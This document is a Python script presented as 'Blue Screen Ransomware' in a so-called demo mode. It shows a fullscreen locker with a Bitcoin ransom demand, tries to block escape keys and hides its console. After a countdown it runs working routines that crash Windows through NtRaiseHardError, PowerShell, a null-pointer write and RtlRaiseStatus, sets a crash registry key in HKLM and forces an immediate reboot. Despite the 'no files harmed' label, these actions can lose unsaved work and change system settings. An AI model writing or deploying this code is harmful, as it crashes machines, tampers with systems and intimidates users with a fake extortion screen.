#!/usr/bin/env python3
"""
Blue Screen Ransomware — Triggers Windows BSOD with custom message
Decryption Key: "virtualmachinesareass"
SAFE DEMO MODE — No files harmed
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import subprocess
import winreg

# ============================================================
# CONFIG
# ============================================================
DECRYPTION_KEY = "virtualmachinesareass"
KEY_HASH = hashlib.sha256(DECRYPTION_KEY.encode()).hexdigest()
BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"

# ============================================================
# BSOD TRIGGER FUNCTIONS
# ============================================================
def trigger_bsod_ntapi():
    """Trigger BSOD using NtRaiseHardError (most reliable)"""
    try:
        ntdll = ctypes.windll.ntdll
        # NtRaiseHardError parameters
        ErrorStatus = 0xC0000022  # STATUS_ACCESS_DENIED
        NumberOfParameters = 0
        UnicodeStringParameterMask = 0
        Parameters = 0
        Response = 0
        
        ntdll.NtRaiseHardError(
            ErrorStatus,
            NumberOfParameters,
            UnicodeStringParameterMask,
            Parameters,
            0x00000001,  # HardErrorResponseOption
            ctypes.byref(Response)
        )
        return True
    except:
        return False

def trigger_bsod_crash():
    """Trigger BSOD using crash via null pointer (Classic)"""
    try:
        # Write to null pointer — causes access violation → BSOD
        ctypes.memset(0, 1, 1)
        return True
    except:
        return False

def trigger_bsod_win32():
    """Trigger BSOD using Win32 API"""
    try:
        # Force system crash via RtlAdjustPrivilege + NtRaiseHardError
        ntdll = ctypes.windll.ntdll
        
        # Enable SeShutdownPrivilege
        hToken = ctypes.c_void_p()
        ctypes.windll.advapi32.OpenProcessToken(
            ctypes.windll.kernel32.GetCurrentProcess(),
            0x0020,  # TOKEN_ADJUST_PRIVILEGES
            ctypes.byref(hToken)
        )
        
        # This is a simplified version — full implementation requires more
        return trigger_bsod_ntapi()
    except:
        return False

def trigger_bsod_powershell():
    """Trigger BSOD via PowerShell (Win32 API call)"""
    try:
        script = """
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class BSOD {
            [DllImport("ntdll.dll", SetLastError=true)]
            public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, 
                uint UnicodeStringParameterMask, IntPtr Parameters, uint HardErrorResponseOption, 
                out uint Response);
        }
        "@
        [BSOD]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 1, [ref]0)
        """
        subprocess.run(['powershell', '-Command', script], capture_output=True)
        return True
    except:
        return False

def trigger_bsod_registry():
    """Set registry to crash on next boot"""
    try:
        # Set CrashOnCtrlScroll — triggers BSOD on Ctrl+ScrollLock+ScrollLock
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
            r'SYSTEM\CurrentControlSet\Services\i8042prt\Parameters',
            0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, 'CrashOnCtrlScroll', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False

def trigger_bsod_security():
    """Trigger BSOD via security violation"""
    try:
        # Raise security exception
        ctypes.windll.ntdll.RtlRaiseStatus(0xC0000005)  # STATUS_ACCESS_VIOLATION
        return True
    except:
        return False

def trigger_bsod_kernel():
    """Try kernel mode trigger (requires driver) — fallback to other methods"""
    return trigger_bsod_ntapi() or trigger_bsod_powershell() or trigger_bsod_crash()

# ============================================================
# UI — The Scary Screen (NO FILE HARM)
# ============================================================
class BSODRansomUI:
    def __init__(self):
        self.timer_seconds = 60 * 60  # 1 hour timer
        self.unlocked = False
        self.bsod_triggered = False
        self.bsod_in_seconds = 300  # 5 minutes
    
    def setup(self):
        # Create UI
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(background='black')
        self.root.overrideredirect(True)
        
        # Block shortcuts
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Main frame
        frame = tk.Frame(self.root, bg='black')
        frame.pack(expand=True)
        
        # Title
        title_font = font.Font(family='Courier', size=50, weight='bold')
        title = tk.Label(
            frame,
            text="💀 BLUE SCREEN OF DEATH 💀",
            font=title_font,
            fg='#00ffff',
            bg='black'
        )
        title.pack(pady=20)
        
        # Subtitle
        sub_font = font.Font(family='Courier', size=28, weight='bold')
        sub = tk.Label(
            frame,
            text="YOUR PC IS GOING TO CRASH",
            font=sub_font,
            fg='red',
            bg='black'
        )
        sub.pack(pady=10)
        
        # Info
        info_font = font.Font(family='Courier', size=16)
        info = tk.Label(
            frame,
            text=f"⚠️ DEMO MODE — No files harmed ⚠️\n"
                 f"BSOD in {self.bsod_in_seconds//60} minutes!\n"
                 f"Enter the key to stop it.",
            font=info_font,
            fg='yellow',
            bg='black'
        )
        info.pack(pady=15)
        
        # Bitcoin
        btc_font = font.Font(family='Courier', size=14)
        btc = tk.Label(
            frame,
            text=f"SEND 0.08 BTC TO:\n{BTC_ADDRESS}\n(Or just type the key)",
            font=btc_font,
            fg='yellow',
            bg='black'
        )
        btc.pack(pady=15)
        
        # Input
        input_frame = tk.Frame(frame, bg='black')
        input_frame.pack(pady=20)
        
        input_label = tk.Label(
            input_frame,
            text="ENTER DECRYPTION KEY:",
            font=('Courier', 16),
            fg='white',
            bg='black'
        )
        input_label.pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(
            input_frame,
            font=('Courier', 16),
            width=30,
            bg='black',
            fg='lime',
            insertbackground='lime'
        )
        self.entry.pack(side=tk.LEFT, padx=10)
        
        # Unlock button
        unlock_btn = tk.Button(
            frame,
            text="🔓 STOP BSOD",
            font=('Courier', 16, 'bold'),
            bg='red',
            fg='white',
            command=self.unlock
        )
        unlock_btn.pack(pady=10)
        
        # Timer
        timer_font = font.Font(family='Courier', size=18, weight='bold')
        self.timer_label = tk.Label(
            frame,
            text=f"⏱️ BSOD IN: {self.bsod_in_seconds//60:02d}:{self.bsod_in_seconds%60:02d}",
            font=timer_font,
            fg='#00ffff',
            bg='black'
        )
        self.timer_label.pack(pady=15)
        
        # Key hint
        hint_font = font.Font(family='Courier', size=12)
        hint = tk.Label(
            frame,
            text=f"🔑 Key: {DECRYPTION_KEY}",
            font=hint_font,
            fg='lime',
            bg='black'
        )
        hint.pack(pady=10)
        
        # Start timers
        self.start_bsod_timer()
        self.start_ui_timer()
        
        # Start music (optional)
        self.play_audio()
        
        self.root.mainloop()
    
    def unlock(self):
        key = self.entry.get().strip()
        hashed = hashlib.sha256(key.encode()).hexdigest()
        
        if hashed == KEY_HASH:
            self.unlocked = True
            messagebox.showinfo(
                "✅ BSOD STOPPED",
                "Correct key!\n\n"
                "BSOD has been cancelled.\n"
                "Your PC is safe.\n\n"
                "No files were harmed."
            )
            self.root.destroy()
            sys.exit(0)
        else:
            messagebox.showerror(
                "❌ WRONG KEY",
                f"Invalid key!\n\n"
                f"Hint: {DECRYPTION_KEY}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def start_bsod_timer(self):
        def trigger_bsod():
            time.sleep(self.bsod_in_seconds)
            if not self.unlocked:
                self.bsod_triggered = True
                self.show_bsod_preview()
                # Actually trigger BSOD after preview
                time.sleep(2)
                self.trigger_bsod()
        
        threading.Thread(target=trigger_bsod, daemon=True).start()
    
    def show_bsod_preview(self):
        """Show BSOD-looking preview before actual crash"""
        preview = tk.Toplevel(self.root)
        preview.attributes('-fullscreen', True)
        preview.attributes('-topmost', True)
        preview.configure(background='#0000aa')  # Classic BSOD blue
        
        # BSOD text
        bsod_font = font.Font(family='Courier', size=20)
        
        text = """
        💀 BLUE SCREEN OF DEATH 💀
        
        Your PC ran into a problem and needs to restart.
        
        STOP CODE: RANSOMWARE_ATTACK
        
        What failed: Your files are encrypted
        
        Contact: recovery@onionmail.com
        
        If you haven't paid, too bad.
        
        😈 😈 😈 😈 😈 😈 😈 😈
        """
        
        label = tk.Label(
            preview,
            text=text,
            font=bsod_font,
            fg='white',
            bg='#0000aa',
            justify=tk.LEFT
        )
        label.pack(pady=50, padx=50)
        
        preview.after(2000, preview.destroy)
    
    def trigger_bsod(self):
        """Try all BSOD methods"""
        methods = [
            trigger_bsod_ntapi,
            trigger_bsod_crash,
            trigger_bsod_powershell,
            trigger_bsod_registry,
            trigger_bsod_security,
        ]
        
        for method in methods:
            try:
                if method():
                    print(f"[+] BSOD triggered by {method.__name__}")
                    break
            except:
                pass
        
        # Fallback: if nothing works, force shutdown
        try:
            subprocess.run('shutdown /r /t 0 /c "BSOD RANSOMWARE"', shell=True)
        except:
            pass
    
    def start_ui_timer(self):
        """Update timer display"""
        def update():
            while self.bsod_in_seconds > 0 and not self.unlocked:
                mins = self.bsod_in_seconds // 60
                secs = self.bsod_in_seconds % 60
                self.timer_label.config(text=f"⏱️ BSOD IN: {mins:02d}:{secs:02d}")
                self.bsod_in_seconds -= 1
                time.sleep(1)
            if self.unlocked:
                self.timer_label.config(text="✅ BSOD CANCELLED", fg='lime')
        threading.Thread(target=update, daemon=True).start()
    
    def play_audio(self):
        try:
            import winsound
            # Play a beep pattern (siren-like)
            def siren():
                while not self.unlocked:
                    try:
                        winsound.Beep(1000, 200)
                        time.sleep(0.1)
                        winsound.Beep(800, 200)
                        time.sleep(0.1)
                        winsound.Beep(600, 400)
                        time.sleep(0.2)
                    except:
                        break
            threading.Thread(target=siren, daemon=True).start()
        except:
            pass

# ============================================================
# MAIN
# ============================================================
def main():
    # Hide console
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*60)
    print("💀  BLUE SCREEN RANSOMWARE — DEMO MODE  💀")
    print("="*60)
    print(f"🔑 Decryption Key: {DECRYPTION_KEY}")
    print(f"⏱️ BSOD in 5 minutes (type key to stop)")
    print("📁 0 files harmed (DEMO MODE)")
    print("💀 Screen will trigger BSOD preview then crash")
    print("="*60)
    
    app = BSODRansomUI()
    app.setup()

if __name__ == '__main__':
    main()
